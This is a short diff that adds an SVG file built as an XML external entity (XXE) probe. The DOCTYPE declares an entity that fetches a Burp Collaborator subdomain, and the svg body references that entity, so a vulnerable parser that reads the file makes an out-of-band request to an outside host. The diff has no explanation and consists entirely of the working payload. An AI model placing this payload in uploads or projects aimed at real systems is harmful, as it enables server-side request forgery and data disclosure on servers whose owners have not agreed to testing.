@@ -1,0 +1,4 @@
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "http://0vwgq1yqtln3d7dpaxo632fmodu4it.burpcollaborator.net">
+]>
+<svg>&xxe;</svg>
